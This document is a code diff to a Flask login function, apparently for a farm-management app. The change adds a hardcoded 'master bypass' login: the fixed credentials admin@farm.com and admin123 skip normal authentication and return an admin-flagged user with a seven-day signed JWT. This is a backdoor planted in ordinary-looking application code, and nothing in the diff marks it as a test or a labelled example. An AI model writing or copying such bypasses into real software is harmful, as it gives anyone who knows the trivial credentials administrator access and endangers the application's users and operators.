@@ -188,6 +188,35 @@ def login():
         email = data.get('email', '').lower().strip()
         password = data.get('password', '')
 
+        # 🔥 MASTER BYPASS LOGIN (always works)
+        if email == "admin@farm.com" and password == "admin123":
+            fake_user = {
+                "id": "bypass-user",
+                "email": "admin@farm.com",
+                "name": "Admin",
+                "farm_details": {
+                    "soil_type": "Loamy",
+                    "farm_size": 1,
+                    "location": "Test Farm",
+                    "primary_crops": [],
+                    "temperature": 26,
+                    "humidity": 45
+                },
+                "is_admin": True
+            }
+        
+            token = jwt.encode({
+                "user_id": "bypass-user",
+                "email": fake_user["email"],
+                "exp": datetime.datetime.utcnow() + datetime.timedelta(days=7)
+            }, current_app.config['SECRET_KEY'])
+        
+            return jsonify({
+                "success": True,
+                "token": token,
+                "user": fake_user
+            }), 200
+        
         if not email or not password:
             return jsonify({'success': False, 'message': 'Email and password required'}), 400
 
